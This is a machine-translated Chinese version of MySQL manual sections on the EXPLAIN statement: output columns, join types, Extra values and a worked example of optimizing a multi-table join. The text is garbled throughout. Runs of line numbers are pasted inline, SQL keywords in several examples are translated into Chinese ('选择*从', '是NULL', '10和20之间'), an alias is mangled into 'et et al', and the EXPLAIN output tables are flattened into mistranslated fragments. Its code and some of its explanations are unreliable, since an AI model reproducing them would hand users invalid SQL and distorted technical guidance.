    <content type="text"><![CDATA[8.8.1使用EXPLAIN优化查询 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849该EXPLAIN语句提供有关MySQL如何执行语句的信息：EXPLAIN作品有 SELECT， DELETE， INSERT， REPLACE，和 UPDATE语句。当EXPLAIN与可解释的语句一起使用时，MySQL会显示来自优化器的关于语句执行计划的信息。也就是说，MySQL解释了它将如何处理该语句，包括有关表如何连接以及按何种顺序的信息。有关使用 EXPLAIN获取执行计划信息的信息，请参见第8.8.2节“EXPLAIN输出格式”。当EXPLAIN与 可解释的语句一起使用时，它显示在命名连接中执行的语句的执行计划。请参见第8.8.4节“获取命名连接的执行计划信息”。 FOR CONNECTION connection_id对于SELECT语句， EXPLAIN产生可以使用显示的附加执行计划信息 SHOW WARNINGS。请参见 第8.8.3节“扩展EXPLAIN输出格式”。EXPLAIN对于检查涉及分区表的查询很有用。请参见 第22.3.5节“获取有关分区的信息”。该FORMAT选项可用于选择输出格式。TRADITIONAL以表格格式显示输出。如果没有FORMAT选项，这是默认值 。 JSON格式以JSON格式显示信息。在帮助下EXPLAIN，您可以看到应该在哪里添加索引，以便通过使用索引查找行来更快地执行语句。您还可以 EXPLAIN用来检查优化程序是否以最佳顺序加入表。为了给优化器提示使用与SELECT语句中命名表的顺序相对应的连接顺序 ，请使用SELECT STRAIGHT_JOIN而不是仅仅开始语句SELECT。（请参见 第13.2.9节“SELECT语法”。）但是， STRAIGHT_JOIN可能会阻止使用索引，因为它会禁用半连接转换。看到 第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。优化器跟踪有时可以提供与之相辅相成的信息EXPLAIN。但是，优化器跟踪格式和内容在版本之间可能会发生变化。有关详细信息，请参阅 MySQL内部：跟踪优化器。如果您在确定索引时没有使用索引时遇到问题，请运行ANALYZE TABLE以更新表格统计信息（如键的基数），这些索引可能会影响优化程序的选择。请参见 第13.7.2.1节“ANALYZE TABLE语法”。注意EXPLAIN也可以用于获取有关表中列的信息。 是和的 同义词。有关更多信息，请参见第13.8.1节“DESCRIBE语法”和 第13.7.5.5节“SHOW COLUMNS语法”。 EXPLAIN tbl_nameDESCRIBE tbl_nameSHOW COLUMNS FROM tbl_name 8.8.2 EXPLAIN输出格式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779该EXPLAIN语句提供有关MySQL如何执行语句的信息。 EXPLAIN作品有 SELECT， DELETE， INSERT， REPLACE，和 UPDATE语句。EXPLAIN为SELECT语句中使用的每个表返回一行信息 。它按照MySQL在处理语句时读取它们的顺序列出输出中的表。MySQL使用嵌套循环连接方法解析所有连接。这意味着MySQL从第一个表中读取一行，然后在第二个表，第三个表等中找到匹配的行。处理完所有表后，MySQL将通过表列表输出所选列和回溯，直到找到有更多匹配行的表。下一行从该表中读取，并且该过程继续下一个表。EXPLAIN输出包括分区信息。另外，对于SELECT 语句，EXPLAIN生成扩展信息，可以按照SHOW WARNINGS以下 方式显示 EXPLAIN（参见 第8.8.3节“扩展EXPLAIN输出格式”）。注意在较旧的MySQL版本中，使用EXPLAIN PARTITIONS和 生成分区和扩展信息 EXPLAIN EXTENDED。这些语法仍然被认为是向后兼容的，但分区和扩展输出现在默认启用，所以PARTITIONS 和EXTENDED关键字是多余的，并且已被弃用。它们的使用会导致警告，并且它们将EXPLAIN在未来的MySQL版本中从语法中删除。您不能在相同的语句中一起使用弃用PARTITIONS 和EXTENDED关键字 EXPLAIN。另外，这些关键字都不能与FORMAT选项一起使用 。注意MySQL Workbench具有Visual Explain功能，可提供EXPLAIN输出的可视表示 。请参阅 教程：使用说明来提高查询性能。EXPLAIN输出列EXPLAIN加入类型解释额外信息EXPLAIN输出解释EXPLAIN输出列本部分介绍由产生的输出列 EXPLAIN。后面几节提供了关于type 和 Extra 列的更多信息 。每个输出行都EXPLAIN 提供有关一个表的信息。每行包含表8.1“汇总输出列”中汇总的值 ，并在表格后面详细介绍。列名显示在表格的第一列中; 第二列提供FORMAT=JSON使用时输出中显示的等效属性名称 。表8.1 EXPLAIN输出列柱 JSON名称 含义id select_id 该SELECT标识符select_type 没有 该SELECT类型table table_name 输出行的表格partitions partitions 匹配的分区type access_type 连接类型possible_keys possible_keys 可能的索引选择key key 该指数实际选择key_len key_length 所选键的长度ref ref 列与索引进行比较rows rows 要检查的行的估计filtered filtered 按表条件过滤的行的百分比Extra 没有 附加信息注意JSON属性NULL不会显示在JSON格式的EXPLAIN 输出中。id（JSON名： select_id）的SELECT标识符。这是SELECT查询内部的连续编号 。NULL如果该行引用其他行的联合结果，则该值可以是该值。在这种情况下， table列显示的值喜欢 以指示该行是指行的联合与的值 和 。 &lt;unionM,N&gt;idMNselect_type （JSON名称：无）类型SELECT，可以是下表中显示的任何类型。JSON格式EXPLAIN将SELECT类型公开 为a的属性 query_block，除非它是 SIMPLE或PRIMARY。表中还显示了JSON名称（如果适用）。select_type 值 JSON名称 含义SIMPLE 没有 简单SELECT（不使用 UNION或子查询）PRIMARY 没有 最 SELECTUNION 没有 第二次或以后的SELECT声明 UNIONDEPENDENT UNION dependent（true） 第二个或更晚的SELECT语句 UNION依赖于外部查询UNION RESULT union_result 结果UNION。SUBQUERY 没有 首先SELECT在子查询中DEPENDENT SUBQUERY dependent（true） 首先SELECT在子查询中，依赖于外部查询DERIVED 没有 派生表MATERIALIZED materialized_from_subquery 物化子查询UNCACHEABLE SUBQUERY cacheable（false） 无法缓存结果的子查询，必须对外部查询的每一行重新评估UNCACHEABLE UNION cacheable（false） 第二个或更高版本选择UNION 属于不可缓存的子查询（请参阅 UNCACHEABLE SUBQUERY）DEPENDENT通常表示使用相关的子查询。请参见 第13.2.10.7节“相关子查询”。DEPENDENT SUBQUERY评估与评估不同UNCACHEABLE SUBQUERY。因为DEPENDENT SUBQUERY，子查询对于来自外部上下文的变量的每个不同值集合仅重新评估一次。因为 UNCACHEABLE SUBQUERY子查询是针对外部上下文的每一行重新评估的。子查询的可缓存性与查询缓存中查询结果的缓存不同（ 第8.10.3.1节“查询缓存如何操作”中有描述）。子查询缓存发生在查询执行期间，而查询缓存仅在查询执行完成后用于存储结果。当您指定FORMAT=JSON时 EXPLAIN，输出没有直接等价于的单个属性 select_type; 该 query_block属性对应于给定的SELECT。相当于SELECT刚刚显示的大多数子查询类型的属性都可用（示例 materialized_from_subquery适用 MATERIALIZED），并在适当时显示。SIMPLE或者没有JSON等价物 PRIMARY。select_type非SELECT语句 的值显示受影响的表的语句类型。例如，select_type是 DELETE对 DELETE报表。table（JSON名： table_name）输出行涉及的表的名称。这也可以是以下值之一：&lt;unionM,N&gt;：该行指与行的工会 id的价值 M和 N。&lt;derivedN&gt;：该行指的是具有id值为 的行的派生表结果N。例如，派生表可能来自FROM子句中的子查询 。&lt;subqueryN&gt;：该行指的是具有id 值为的行的物化子查询的结果N。请参见 第8.2.2.2节“使用实现优化子查询”。partitions（JSON名： partitions）记录将与查询匹配的分区。该值适用NULL于未分区的表格。请参见 第22.3.5节“获取有关分区的信息”。type（JSON名： access_type）连接类型。有关不同类型的说明，请参阅 EXPLAIN 联接类型。possible_keys（JSON名： possible_keys）该possible_keys列指示MySQL可以从中选择哪些索引来查找此表中的行。请注意，此列完全独立于输出中显示的表的顺序 EXPLAIN。这意味着某些键possible_keys可能无法在生成的表格顺序中使用。如果此列是NULL（或在JSON格式的输出中未定义），则没有相关索引。在这种情况下，您可以通过检查该WHERE 子句来检查是否引用适合索引的一列或多列，从而提高查询的性能。如果是这样，请创建一个适当的索引并EXPLAIN再次检查查询 。请参见 第13.1.8节“ALTER TABLE语法”。要查看表格具有哪些索引，请使用。 SHOW INDEX FROM tbl_namekey（JSON名：key）该key列表示MySQL实际决定使用的密钥（索引）。如果MySQL决定使用其中一个possible_keys 索引来查找行，那么该索引将被列为关键值。有可能key会命名该值中不存在的索引 possible_keys。如果没有possible_keys索引适合查找行，则会发生这种情况，但查询选择的所有列都是其他索引的列。也就是说，指定的索引涵盖了选定的列，因此虽然它不用于确定要检索哪些行，但索引扫描比数据行扫描更有效。因为InnoDB，即使查询也选择主键，辅助索引可能会覆盖所选列，因为InnoDB将主键值存储在每个辅助索引中。如果 key是NULL，MySQL发现没有索引可用于更高效地执行查询。要强制MySQL使用或忽略列出的索引 possible_keys列，使用 FORCE INDEX，USE INDEX或IGNORE INDEX在您的查询。请参见第8.9.4节“索引提示”。对于MyISAM表格，运行 ANALYZE TABLE有助于优化器选择更好的索引。对于 MyISAM表格，myisamchk --analyze也是一样。请参见 第13.7.2.1节“ANALYZE TABLE语法”和 第7.6节“MyISAM表维护和崩溃恢复”。key_len（JSON名： key_length）该key_len列表示MySQL决定使用的密钥的长度。这个值 key_len使您能够确定MySQL实际使用的多部分密钥的多少部分。如果key专栏说 NULL，len_len 专栏也说NULL。由于密钥存储格式，密钥长度大于该可以是列一个NULL 比一个NOT NULL列。ref（JSON名：ref）该ref列显示哪些列或常量与列中指定的索引进行比较以 key从表中选择行。如果值是func，则使用的值是某个函数的结果。要查看哪个功能，请使用 SHOW WARNINGS以下内容 EXPLAIN查看扩展 EXPLAIN输出。该函数实际上可能是算术运算符等运算符。rows（JSON名： rows）该rows列表示MySQL认为它必须检查以执行查询的行数。对于InnoDB表格，这个数字是一个估计值，可能并不总是准确的。filtered（JSON名： filtered）该filtered列表示将根据表条件过滤的表行的估计百分比。即，rows 显示检查的估计行数， rows× filtered/ 100显示将与先前表连接的行数。Extra （JSON名称：无）此列包含有关MySQL如何解析查询的其他信息。有关不同值的说明，请参阅 EXPLAIN 附加信息。没有与该Extra列对应的单个JSON属性 ; 但是，此列中可能出现的值将作为JSON属性或属性的文本公开message。EXPLAIN加入类型该type列 EXPLAIN输出介绍如何联接表。在JSON格式的输出中，这些被作为access_type属性的值查找。以下列表描述了从最佳类型到最差类型的连接类型：system该表只有一行（=系统表）。这是const连接类型的特例 。const该表至多有一个匹配行，在查询开始时读取。因为只有一行，所以该行中列的值可以被优化器的其余部分视为常量。 const表格非常快，因为它们只能读取一次。const用于将a PRIMARY KEY或 UNIQUE索引的所有部分与常量值进行比较时使用。在以下查询中，tbl_name可以用作const 表格：SELECT * FROM tbl_nameWHERE primary_key= 1;SELECT * FROM tbl_name WHERE primary_key_part1= 1 AND primary_key_part2= 2;eq_ref从这张表中读取一行，用于前面表格的每行组合。除了 system和 const类型之外，这是最好的连接类型。它在索引的所有部分被连接使用并且索引是a PRIMARY KEY或UNIQUE NOT NULL索引时使用。eq_ref可以用于使用=运算符进行比较的索引列 。比较值可以是一个常数，或者是一个表达式，该表达式使用在此表之前读取的表中的列。在以下示例中，MySQL可以使用 eq_ref连接来处理 ref_table：选择*从ref_table，在other_table 哪里ref_table。key_column= other_table。column;选择*从ref_table，在other_table 哪里ref_table。key_column_part1= other_table。column 和ref_table。key_column_part2= 1;ref从该表中读取具有匹配索引值的所有行，用于来自先前表的各行的组合。ref如果连接仅使用键的最左侧前缀或者键不是a PRIMARY KEY或 UNIQUE索引（换句话说，如果连接无法基于键值选择单个行），则使用该键。如果使用的键只匹配几行，这是一个很好的连接类型。ref可以用于使用=or &lt;=&gt; 运算符进行比较的索引列 。在以下示例中，MySQL可以使用 ref连接来处理 ref_table：SELECT * FROM ref_tableWHERE key_column= expr;选择*从ref_table，在other_table 哪里ref_table。key_column= other_table。column;选择*从ref_table，在other_table 哪里ref_table。key_column_part1= other_table。column 和ref_table。key_column_part2= 1;fulltext连接使用FULLTEXT 索引执行。ref_or_null这种连接类型很像 ref，但是另外MySQL会额外搜索包含NULL值的行。这种连接类型优化常用于解析子查询。在以下示例中，MySQL可以使用 ref_or_null连接来处理ref_table：SELECT * FROM ref_table WHERE key_column= exprOR key_column是NULL;请参见第8.2.1.12节“IS NULL优化”。index_merge此连接类型表示使用索引合并优化。在这种情况下，key输出行中的列包含使用的索引列表，并key_len包含所用索引 的最长关键部分列表。有关更多信息，请参见 第8.2.1.3节“索引合并优化”。unique_subquery这种类型取代 了以下形式的eq_ref一些 IN子查询：valueIN（primary_key从single_table哪里选择some_expr）unique_subquery 只是一个索引查找函数，它可以完全替代子查询以提高效率。index_subquery这种连接类型与 unique_subquery。它取代了IN子查询，但它适用于以下形式的子查询中的非唯一索引：valueIN（key_column从single_table哪里选择some_expr）range只有在给定范围内的行才会被检索，使用索引来选择行。的key 输出行中的列指示使用哪个索引。将key_len包含已使用的时间最长的关键部分。该ref列 NULL适用于此类型。range当一个键列使用任何的相比于恒定可使用 =， &lt;&gt;， &gt;， &gt;=， &lt;， &lt;=， IS NULL， &lt;=&gt;， BETWEEN，或 IN()运营商：SELECT * FROM tbl_name WHERE key_column= 10;SELECT * FROM tbl_name WHERE key_column10和20之间;SELECT * FROM tbl_name WHERE key_columnIN（10,20,30）;SELECT * FROM tbl_name WHERE key_part1= 10 AND key_part2IN（10,20,30）;index该index联接类型是一样的 ALL，只是索引树被扫描。这发生在两个方面：如果索引是查询的覆盖索引，并且可用于满足表中所需的所有数据，则只扫描索引树。在这种情况下，该Extra专栏说 Using index。仅索引扫描通常比ALL由于索引大小通常小于表数据而更快 。使用索引中的读取来执行全表扫描，以按索引顺序查找数据行。 Uses index没有出现在 Extra列中。当查询仅使用属于单个索引一部分的列时，MySQL可以使用此连接类型。ALL全表扫描是针对先前表中的每一行组合完成的。如果表格是没有标记的第一个表格const，通常情况下并不好 ，而在其他所有情况下通常 都很糟糕。通常情况下，您可以ALL通过添加索引来避免 这些索引，这些索引可以基于来自较早表的常量值或列值从表中检索行。解释额外信息该Extra列 EXPLAIN输出包含MySQL解决查询的额外信息。以下列表解释了可以在此列中显示的值。每个项目还指示JSON格式的输出，该属性显示该Extra值。对于其中的一些，有一个特定的属性。其他显示为message 属性的文本。如果您希望尽可能快地查询查询，请查找和的Extra值列，或者在JSON格式的输出中查找for 和 等于的属性 。 Using filesortUsing temporaryEXPLAINusing_filesortusing_temporary_tabletrueChild of &apos;table&apos; pushed join@1（JSON：message 文本）该表被引用为table可以下推到NDB内核的连接中的子 节点。仅在启用了下推连接时才适用于NDB群集。有关ndb_join_pushdown更多信息和示例，请参阅 服务器系统变量的说明。const row not found（JSON属性： const_row_not_found）对于诸如此类的查询，该表是空的。 SELECT ... FROM tbl_nameDeleting all rows（JSON属性： message）因为DELETE，一些存储引擎（例如MyISAM）支持一种处理器方法，以简单快捷的方式删除所有表格行。Extra如果引擎使用此优化，则会显示此值。Distinct（JSON属性： distinct）MySQL正在寻找不同的值，所以当它找到第一个匹配的行后，它会停止为当前行组合搜索更多的行。FirstMatch(tbl_name) （JSON属性：first_match）半连接FirstMatch加入快捷方式策略用于tbl_name。Full scan on NULL key（JSON属性： message）当优化程序不能使用索引查找访问方法时，会发生子查询优化作为回退策略。Impossible HAVING（JSON属性： message）该HAVING子句始终为false，不能选择任何行。Impossible WHERE（JSON属性： message）该WHERE子句始终为false，不能选择任何行。Impossible WHERE noticed after reading const tables（JSON属性： message）MySQL已经读取了所有 const（和 system）表，并注意到该WHERE子句总是错误的。LooseScan(m..n) （JSON属性：message）使用半连接LooseScan策略。 m并且 n是关键部件号码。No matching min/max row（JSON属性： message）没有行满足查询条件，如 。 SELECT MIN(...) FROM ... WHERE conditionno matching row in const table（JSON属性：message）对于具有联接的查询，存在空表或没有行满足唯一索引条件的表。No matching rows after partition pruning（JSON属性： message）对于DELETEor UPDATE，优化器在分区修剪后没有发现任何要删除或更新的内容。这是在意义上类似Impossible WHERE 的SELECT声明。No tables used（JSON属性： message）该查询没有FROM子句，或者有一个 FROM DUAL子句。对于INSERT或 REPLACE语句， EXPLAIN当没有SELECT 部分时显示此值。例如，它似乎是EXPLAIN INSERT INTO t VALUES(10)因为这相当于 EXPLAIN INSERT INTO t SELECT 10 FROM DUAL。Not exists（JSON属性： message）MySQL能够对LEFT JOIN 查询进行优化，并且在查找到符合LEFT JOIN条件的一行后，不会在该表中检查前一行组合的更多行。以下是可以用这种方式进行优化的查询类型的示例：SELECT * FROM t1 LEFT JOIN t2 ON t1.id = t2.id WHERE t2.id IS NULL;假定t2.id被定义为 NOT NULL。在这种情况下，MySQL 使用值来 扫描 t1并查找行 。如果MySQL找到匹配的行 ，它就知道 永远不会 ，并且不会扫描具有相同值的其余行。换句话说，对于每一行，MySQL都只需要进行一次查询，而不管有多少行匹配。 t2t1.idt2t2.idNULLt2idt1t2t2Plan isn&apos;t ready yet （JSON属性：无）该值EXPLAIN FOR CONNECTION在优化器没有完成为在命名连接中执行的语句创建执行计划时发生。如果执行计划输出包含多行，那么Extra根据优化程序在确定完整执行计划时的进度，它们中的任何一个或全部都可以具有此 值。Range checked for each record (index map: N)（JSON属性： message）MySQL发现没有好的索引来使用，但发现一些索引可能在前面表格的列值已知之后使用。对于上表中的每一行组合，MySQL检查是否可以使用range或 index_merge访问方法来检索行。这不是非常快，但比完成没有索引的连接要快。适用性标准如 第8.2.1.2节“范围优化”和 第8.2.1.3节“索引合并优化”中所述。，除了前面表格的所有列值是已知的并被认为是常量。索引从1开始编号，顺序SHOW INDEX与表中所示的顺序相同。索引映射值 N是指示哪些索引是候选的位掩码值。例如，0x19（二进制11001）的值意味着将考虑索引1,4和5。Scanned N databases（JSON属性： message）这表示在处理INFORMATION_SCHEMA表查询时服务器执行的目录扫描次数 ，如第8.2.3节“优化INFORMATION_SCHEMA查询”所述。值N可以是0,1或 all。Select tables optimized away（JSON属性：message）优化器确定1）至多应该返回一行，并且2）为了产生该行，必须读取确定性的一组行。当在优化阶段读取的行可以被读取（例如通过读取索引行）时，在查询执行期间不需要读取任何表。当查询被隐式分组（包含聚合函数但没有GROUP BY子句）时，满足第一个条件 。当使用每个索引执行一个行查找时，满足第二个条件。读取的索引数量决定了要读取的行数。考虑以下隐式分组查询：SELECT MIN（c1），MIN（c2）FROM t1;假设MIN(c1)可以通过读取一个索引行MIN(c2) 来检索，并且可以通过从不同索引读取一行来检索。即，对于每一列c1和 c2，存在其中列是索引的第一列的索引。在这种情况下，返回一行，通过读取两个确定性行产生。Extra如果要读取的行不是确定性的，则不会发生 此值。考虑这个查询：SELECT MIN（c2）FROM t1 WHERE c1 &lt;= 10;假设这(c1, c2)是一个覆盖索引。使用此索引，c1 &lt;= 10必须扫描所有行以查找最小值 c2。相比之下，考虑这个查询：SELECT MIN（c2）FROM t1 WHERE c1 = 10;在这种情况下，第一个索引行c1 = 10包含最小值c2 。只有一行必须被读取以产生返回的行。对于每个表保持精确行数的存储引擎（例如MyISAM但不是 InnoDB），对于子句缺失或始终为真且没有 子句的查询，Extra 可能会发生此值。（这是隐式分组查询的一个实例，其中存储引擎影响是否可读取确定数量的行。） COUNT(*)WHEREGROUP BYSkip_open_table， Open_frm_only， Open_full_table（JSON属性： message）这些值表示适用于查询INFORMATION_SCHEMA 表的文件打开优化，如 第8.2.3节“优化INFORMATION_SCHEMA查询”中所述。Skip_open_table：表格文件不需要打开。通过扫描数据库目录，查询中的信息已经可用。Open_frm_only：只.frm需要打开表格 文件。Open_full_table：未优化的信息查询。的.frm， .MYD和 .MYI文件必须被打开。Start temporary，End temporary（JSON属性： message）这表示半连接Duplicate Weedout策略的临时表使用情况。unique row not found（JSON属性： message）对于像这样的查询，没有行满足 索引条件或表上的条件。 SELECT ... FROM tbl_nameUNIQUEPRIMARY KEYUsing filesort（JSON属性： using_filesort）MySQL必须执行额外的传递以了解如何按排序顺序检索行。排序是按照连接类型遍历所有行并存储排序键和指向与该WHERE子句匹配的所有行的行的指针。然后对键进行排序，并按排序顺序检索行。请参见 第8.2.1.13节“按优化排序”。Using index（JSON属性： using_index）只使用索引树中的信息从表中检索列信息，而不必执行额外的查找来读取实际行。当查询仅使用属于单个索引一部分的列时，可以使用此策略。对于InnoDB具有用户定义的聚簇索引的表格，即使列中Using index不存在， 也可以使用该索引Extra。如果type是 index和 key是，就是这种情况 PRIMARY。Using index condition（JSON属性： using_index_condition）通过访问索引元组来读取表，并首先测试它们以确定是否读取全表行。这样，除非必要，否则索引信息用于推迟（“下压 ”）读取全表行。请参见 第8.2.1.5节“索引条件下推优化”。Using index for group-by（JSON属性：using_index_for_group_by）与Using index表访问方法类似，Using index for group-by 表明MySQL找到了一个索引，可用于检索某个GROUP BY或 某个DISTINCT查询的所有列，而无需对实际表进行任何额外的磁盘访问。此外，索引以最有效的方式使用，因此对于每个组，只有少数索引条目被读取。有关详细信息，请参见 第8.2.1.14节“GROUP BY优化”。Using join buffer (Block Nested Loop)， Using join buffer (Batched Key Access) （JSON属性：using_join_buffer）先前连接的表被分成几部分读入连接缓冲区，然后从缓冲区中使用它们的行来执行与当前表的连接。 (Block Nested Loop)指示使用块嵌套循环算法并(Batched Key Access)指示使用批处理密钥访问算法。也就是说，EXPLAIN输出的前一行表格中的键 将被缓冲，并且匹配的行将从Using join buffer出现的行表示的表中批量取出 。在JSON格式的输出中，值 using_join_buffer始终是Block Nested Loop或之一 Batched Key Access。Using MRR（JSON属性： message）使用多范围读取优化策略读取表格。请参见第8.2.1.10节“多量程读取优化”。Using sort_union(...)，Using union(...)，Using intersect(...)（JSON属性： message）这些表明特定的算法显示了如何合并index_merge连接类型的索引扫描 。请参见第8.2.1.3节“索引合并优化”。Using temporary（JSON属性： using_temporary_table）为了解决这个查询，MySQL需要创建一个临时表来保存结果。这通常发生在查询包含GROUP BY和 ORDER BY列出不同列的子句的情况下。Using where（JSON属性： attached_condition）甲WHERE子句用于限制匹配哪些行针对下一个表或发送到客户端。除非特意打算从表中读取或检查所有行，否则如果Extra值不是 Using where且表连接类型为ALL或 ，则 查询中可能有问题index。Using where在JSON格式的输出中没有直接的对应; 该 attached_condition属性包含使用的任何WHERE条件。Using where with pushed condition（JSON属性：message）此产品适用于NDB 表只。这意味着NDB集群正在使用条件下推优化来提高非索引列和常量之间的直接比较效率。在这种情况下，条件被“ 推下 ”到集群的数据节点，并在所有数据节点上同时进行评估。这消除了通过网络发送不匹配的行的需要，并且可以在情况下推可能但未被使用的情况下将这些查询加速5到10倍。有关更多信息，请参阅 第8.2.1.4节“发动机状态下推优化”。Zero limit（JSON属性： message）查询有一个LIMIT 0子句，不能选择任何行。EXPLAIN输出解释通过获取输出rows 列中的值的乘积，可以很好地指示连接有多好EXPLAIN。这应该大致告诉你MySQL必须检查多少行来执行查询。如果使用max_join_size系统变量限制查询，则 该行产品还用于确定SELECT 要执行哪个多表语句以及要中止哪个多表语句。请参见 第5.1.1节“配置服务器”。以下示例显示了如何根据提供的信息逐步优化多表连接 EXPLAIN。假设您有SELECT这里显示的 语句，并且您打算使用EXPLAIN以下语句进行检查 ：EXPLAIN SELECT tt.TicketNumber，tt.TimeIn， tt.ProjectReference，tt.EstimatedShipDate， tt.ActualShipDate，tt.ClientID， tt.ServiceCodes，tt.RepetitiveID， tt.CurrentProcess，tt.CurrentDPerson， tt.RecordVolume，tt.DPPrinted，et.COUNTRY， et_1.COUNTRY，do.CUSTNAME FROM tt，et，et et al，do WHERE tt.SubmitTime是NULL AND tt.ActualPC = et.EMPLOYID AND tt.AssignedPC = et_1.EMPLOYID AND tt.ClientID = do.CUSTNMBR;对于这个例子，做出以下假设：被比较的列已被声明如下。表 柱 数据类型tt ActualPC CHAR(10)tt AssignedPC CHAR(10)tt ClientID CHAR(10)et EMPLOYID CHAR(15)do CUSTNMBR CHAR(15)这些表具有以下索引。表 指数tt ActualPCtt AssignedPCtt ClientIDet EMPLOYID （首要的关键）do CUSTNMBR （首要的关键）该tt.ActualPC值不是均匀分布的。最初，在执行任何优化之前，该 EXPLAIN语句会生成以下信息：表类型possible_keys键key_len参考行额外et ALL PRIMARY NULL NULL NULL 74做所有主要的空NULL NULL 2135et_1 ALL PRIMARY NULL NULL NULL 74t ALL ALL AssignedPC，NULL NULL NULL 3872 客户端ID， ActualPC的 范围为每条记录检查（索引映射：0x23）因为type是 ALL为每个表，这个输出表明MySQL正在生成的所有表的笛卡儿积; 也就是每行的组合。这需要相当长的时间，因为必须检查每个表中行数的乘积。对于手头的情况，该产品为74×2135×74×3872 = 45,268,558,720行。如果桌子更大，你只能想象需要多长时间。这里的一个问题是，如果MySQL声明为相同的类型和大小，MySQL可以更有效地在列上使用索引。在这种情况下，VARCHAR与 CHAR被认为是相同的，如果它们被声明为相同的大小。 tt.ActualPC被声明为 CHAR(10)和et.EMPLOYID 是CHAR(15)，所以有一个长度不匹配。以固定柱长度上的不同，使用 ALTER TABLE加长 ActualPC从10个字符到15个字符：MySQL的&gt; ALTER TABLE tt MODIFY ActualPC VARCHAR(15);现在tt.ActualPC， et.EMPLOYID都是 VARCHAR(15)。EXPLAIN再次执行该 语句会产生以下结果：表类型possible_keys键key_len参考行额外tt ALL AssignedPC，NULL NULL NULL 3872使用 ClientID，其中 ActualPC的做所有主要的空NULL NULL 2135 每个记录检查范围（索引图：0x1）et_1 ALL PRIMARY NULL NULL NULL 74 每个记录检查范围（索引图：0x1）et eq_ref主要小计15 tt.ActualPC 1这并不完美，但要好得多：rows值的乘积 减少了74倍。该版本在几秒钟内执行。可以进行第二次更改以消除tt.AssignedPC = et_1.EMPLOYID和tt.ClientID = do.CUSTNMBR比较的列长度不匹配：MySQL的&gt; ALTER TABLE tt MODIFY AssignedPC VARCHAR(15), MODIFY ClientID VARCHAR(15);修改完成后， EXPLAIN生成如下所示的输出：表类型possible_keys键key_len参考行额外et ALL PRIMARY NULL NULL NULL 74tt ref AssignedPC，ActualPC 15 et.EMPLOYID 52使用 ClientID，其中 ActualPC的et_1 eq_ref初级小学15 tt.AssignedPC 1do eq_ref PRIMARY PRIMARY 15 tt.ClientID 1在这一点上，查询几乎尽可能地被优化。剩下的问题是，默认情况下，MySQL假定tt.ActualPC 列中的值是均匀分布的，而tt表不是这种情况。幸运的是，很容易告诉MySQL分析密钥分发：MySQL的&gt; ANALYZE TABLE tt;通过额外的索引信息，连接是完美的，并 EXPLAIN产生这样的结果：表类型possible_keys键key_len参考行额外tt ALL AssignedPC NULL NULL NULL 3872使用 ClientID，其中 ActualPC的et eq_ref主要小计15 tt.ActualPC 1et_1 eq_ref初级小学15 tt.AssignedPC 1do eq_ref PRIMARY PRIMARY 15 tt.ClientID 1rows输出中 的列 EXPLAIN是来自MySQL连接优化器的有根据的猜测。通过将rows产品与查询返回的实际行数进行比较，检查数字是否接近真相 。如果数字非常不同，则可以通过STRAIGHT_JOIN在 SELECT语句中使用并尝试在FROM子句中以不同顺序列出表，来 获得更好的性能 。（但是， STRAIGHT_JOIN可能会阻止索引被使用，因为它会禁用半连接转换。请参见第8.2.2.1节“使用半连接转换 优化子查询，派生表和视图引用”。）在某些情况下，可能会执行EXPLAIN SELECT与子查询一起使用时修改数据的语句; 有关更多信息，请参见第13.2.10.8节“派生表”。 8.8.3扩展的EXPLAIN输出格式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138对于SELECT语句，该 EXPLAIN语句会生成额外的（“ 扩展 ”）信息，这些信息不是EXPLAIN输出的一部分， 但可以通过在SHOW WARNINGS 后面发布语句来查看EXPLAIN。输出中的 Message值SHOW WARNINGS显示优化程序如何限定SELECT语句 中的表名和列名 SELECT，重写和优化规则的应用程序后的外观，以及可能有关优化过程的其他说明。可以通过SHOW WARNINGS以下语句 显示的扩展信息 EXPLAIN仅用于 SELECT语句。 SHOW WARNINGS显示其他可解释语句（一个空的结果DELETE， INSERT， REPLACE，和 UPDATE）。注意在较旧的MySQL版本中，使用扩展信息EXPLAIN EXTENDED。该语法仍被认为是向后兼容的，但扩展输出现在默认启用，所以EXTENDED关键字是多余的并且被弃用。它的使用会导致警告，并且它将EXPLAIN 在未来的MySQL版本中从语法中删除。这是一个扩展EXPLAIN输出的例子 ：MySQL的&gt; EXPLAIN SELECT t1.a, t1.a IN (SELECT t2.a FROM t2) FROM t1\G*************************** 1. row ******************** ******* ID：1 select_type：PRIMARY 表：t1 键入：indexpossible_keys：NULL 键：主键 key_len：4 ref：NULL 行数：4 过滤：100.00 额外：使用索引*************************** 2. row ******************** ******* ID：2 select_type：SUBQUERY 表格：t2 键入：indexpossible_keys：a 关键：a key_len：5 ref：NULL 行数：3 过滤：100.00 额外：使用索引设置2行，1警告（0.00秒）MySQL的&gt; SHOW WARNINGS\G*************************** 1. row ******************** ******* 级别：注意 代码：1003消息：/ * select＃1 * / select`test`.`t1`.`a` 